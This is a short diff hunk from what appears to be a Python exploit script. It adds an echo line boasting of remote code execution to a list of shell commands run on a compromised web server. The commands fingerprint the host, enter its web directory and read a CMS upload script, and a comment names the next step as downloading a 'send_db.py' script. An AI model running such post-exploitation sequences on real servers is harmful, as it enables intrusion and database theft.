@@ -461,6 +461,7 @@ if __name__ == "__main__":
         "uname -a",
         "cd /var/www/secureskies/secureskies",
         "ls",
+        "echo 'R3M0T3_C0D3_3X3CUTI10N_1S_DAMN_FUN'",
         "cat custom_upload_cms_script.py",
         
         # Step 2c: Download send_db.py script
